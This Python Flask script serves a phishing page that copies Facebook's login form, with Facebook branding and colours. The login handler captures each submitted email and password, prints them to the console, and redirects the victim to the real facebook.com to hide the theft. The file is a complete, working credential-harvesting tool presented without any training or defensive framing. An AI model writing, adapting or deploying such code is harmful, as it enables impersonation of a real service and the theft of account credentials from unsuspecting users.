from flask import Flask, request, render_template_string, redirect
import csv
import os

app = Flask(__name__)

html_content = """
<!DOCTYPE html>
<html lang=\"en\">
<head>
    <meta charset=\"UTF-8\">
    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
    <title>FaceLook - Log In</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 300px;
        }
        .logo {
            font-size: 32px;
            font-weight: bold;
            color: #1877f2;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .login-btn {
            background-color: #1877f2;
            color: white;
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        .login-btn:hover {
            background-color: #1558b0;
        }
        .forgot-link {
            display: block;
            margin-top: 10px;
            color: #1877f2;
            text-decoration: none;
        }
        .signup-btn {
            margin-top: 20px;
            background-color: #42b72a;
        }
        .signup-btn:hover {
            background-color: #36a420;
        }
    </style>
</head>
<body>
    <div class=\"container\">
        <div class=\"logo\">Facebook</div>
        <form action=\"/login\" method=\"POST\">
            <input type=\"text\" name=\"email\" placeholder=\"Email or phone number\" required>
            <input type=\"password\" name=\"password\" placeholder=\"Password\" required>
            <button type=\"submit\" class=\"login-btn\">Log In</button>
        </form>
        <a href=\"#\" class=\"forgot-link\">Forgot password?</a>
        <button class=\"login-btn signup-btn\">Create New Account</button>
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(html_content)

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')

    print(f"{email}: {password}")
    
    return redirect("https://www.facebook.com")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
